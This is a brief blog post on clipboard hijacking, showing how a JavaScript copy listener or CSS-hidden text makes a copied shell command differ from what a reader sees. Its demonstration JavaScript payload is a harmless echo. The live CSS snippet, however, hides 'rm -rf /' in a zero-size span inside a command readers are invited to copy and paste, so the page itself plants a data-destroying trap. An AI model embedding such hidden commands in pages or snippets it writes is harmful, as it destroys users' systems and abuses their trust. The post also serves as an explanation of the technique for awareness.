---

layout: post
title:  "On Ctrl-C Ctrl-V"
date:   2021-05-29 11:30:00
categories: Hacking 
---

Javascript is extremely powerful, to say the least. One of its often overlooked features is the `copy` event listener.

What damage can that do? Here, copy this 'innocent' command (*meant to be pasted into a shell*) and paste it somewhere.

<p id='fakecopy'><code>$ echo "innocent text"</code></p>

<script>
 document.getElementById('fakecopy').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain',
        'echo "This could\'ve be something malicious!😈"\n');
    e.preventDefault();
});
</script>

The text you just copied even has an `Enter` character, so the command will execute automatically if pasted in a shell, and **I will have control over this system before you can even comprehend what just went down**.

This is how the code works,

```javascript
document.getElementById('fakecopy').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain',
        'echo "This could\'ve be something malicious!😈"\n');
    e.preventDefault();
});
```

Think you'll be safe if by disabling Javascript? Sorry to burst your bubble but this can also be done with raw CSS.

<p id='fakecopy'> <code>$ echo <span style="font-size: 0;">; rm -rf / ; echo </span>"looks safe to me!"</code></p>

This is how that works,

```css
$ echo <span style="font-size: 0">; echo 'malicious command' ; echo </span>"looks safe to me!"
```
